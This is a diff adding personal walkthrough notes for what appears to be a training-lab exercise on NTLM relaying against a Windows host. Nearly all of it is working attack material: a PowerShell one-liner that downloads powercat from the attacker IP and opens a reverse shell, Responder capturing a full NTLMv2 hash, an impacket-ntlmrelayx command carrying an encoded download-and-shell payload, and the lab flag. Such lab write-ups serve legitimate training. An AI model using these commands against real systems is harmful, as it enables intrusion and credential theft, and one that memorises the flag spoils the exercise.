@@ -5,3 +5,56 @@ Start the ntlmrelayx server as shown in Listing 52.
 Access the Beta App and execute the dir command shown in Listing 54.
 Remember to use your assigned Kali IP address.
 
+sudo nmap -sS 192.168.192.202
+PORT     STATE SERVICE
+21/tcp   open  ftp
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+8000/tcp open  http-alt
+
+# Open the 8000 port
+http://192.168.192.202:8000
+
+# From the Beta app we can sdee we can provide the PowerShell command line into the textbox.
+nc -lvnp 6688
+
+# Paste below Pwsh command 
+IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.178/powercat.ps1'); powercat -c 192.168.45.178 -p 6688 -e powershell
+
+# Get the anastasia user password use Responder
+sudo responder -I tun0
+
+# On the victim machine try access to the responder
+PS C:\Users\anastasia\goapp> whoami
+whoami
+brute2\anastasia
+
+PS C:\Users\anastasia\goapp> dir \\192.168.45.178\test
+
+# Responder feedbacks
+[SMB] NTLMv2-SSP Client   : 192.168.192.202
+[SMB] NTLMv2-SSP Username : BRUTE2\anastasia
+[SMB] NTLMv2-SSP Hash     : anastasia::BRUTE2:a1ef7bacb430eba4:D31A6B4CC23860E2FFF0DABB2344255E:010100000000000000A3D0A1F798DA019A9D755CEDF2E8CB000000000200080031004D005200370001001E00570049004E002D0047004E00570036003600530056004D0049003800390004003400570049004E002D0047004E00570036003600530056004D004900380039002E0031004D00520037002E004C004F00430041004C000300140031004D00520037002E004C004F00430041004C000500140031004D00520037002E004C004F00430041004C000700080000A3D0A1F798DA0106000400020000000800300030000000000000000000000000200000C907EC412CAB89CC00C75E3ABD5D91A95638F3BE6CEA03EF27458492EC9072200A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100370038000000000000000000
+
+# Netcat listen
+nc -lvnp 6699
+
+# Prepare one liner of the powershell
+Refer to pwsh-revshell.ps1 #Options 2
+
+# Exploit
+impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.192.212 -c "powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEANwA4AC8AcABvAHcAZQByAGMAYQB0AC4AcABzADEAJwApADsAIABwAG8AdwBlAHIAYwBhAHQAIAAtAGMAIAAxADkAMgAuADEANgA4AC4ANAA1AC4AMQA3ADgAIAAtAHAAIAA2ADYAOQA5ACAALQBlACAAcABvAHcAZQByAHMAaABlAGwAbAA="
+
+# Troubleshooting failure to start the NTLM relay
+OSError: [Errno 98] Address already in use
+# Stop the Responder service that we had launch early
+
+PS C:\> dir \\192.168.45.178\test
+
+PS C:\Users\anastasia\Desktotype flag.txt
+type flag.txt
+OS{8d364ff9f13739846a57d3b0afbcfe3f}
+
+
